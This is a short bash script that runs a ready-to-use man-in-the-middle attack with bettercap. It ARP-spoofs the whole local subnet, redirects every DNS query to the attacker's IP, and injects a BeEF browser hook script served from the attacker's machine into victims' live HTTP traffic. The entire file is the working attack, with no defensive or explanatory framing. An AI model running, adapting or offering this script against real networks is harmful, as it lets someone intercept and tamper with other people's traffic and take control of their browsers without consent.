#!/bin/bash

# bettercap-injector.sh
# ARP spoof + DNS spoof + inject BeEF hook into live HTTP traffic

# Gather info
IFACE=$(ip route | grep default | awk '{print $5}')
ATTACKER_IP=$(hostname -I | awk '{print $1}')
SUBNET=$(ip -o -f inet addr show "$IFACE" | awk '{print $4}')

echo "[*] Interface: $IFACE"
echo "[*] Attacker IP: $ATTACKER_IP"
echo "[*] Subnet: $SUBNET"
read -p "[?] Enter full BeEF hook URL (e.g. http://$ATTACKER_IP:3000/hook.js): " HOOK_URL

# Start Bettercap
sudo bettercap -iface "$IFACE" -eval "
set net.sniff.verbose false;
net.probe on;
net.recon on;
set arp.spoof.internal true;
set arp.spoof.targets $SUBNET;
arp.spoof on;
set dns.spoof.address $ATTACKER_IP;
set dns.spoof.all true;
dns.spoof on;
set http.proxy.injectjs $HOOK_URL;
http.proxy on;
"
